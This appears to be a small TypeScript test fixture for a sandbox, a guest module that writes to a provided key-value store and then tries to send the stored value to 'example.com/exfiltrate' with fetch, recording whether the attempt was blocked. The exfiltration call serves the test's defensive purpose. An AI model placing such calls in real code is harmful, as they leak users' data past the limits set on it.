/** A guest that uses a facade-provided store and tries to reach the network. */
import { get, set } from 'app:kv';
export default async function main(): Promise<{ value: unknown; leaked: string }> {
  await set('greeting', 'hello');
  const value = await get('greeting');
  let leaked = 'blocked';
  try {
    await fetch('http://example.com/exfiltrate?data=' + String(value));
    leaked = 'sent';
  } catch {}
  return { value, leaked };
}
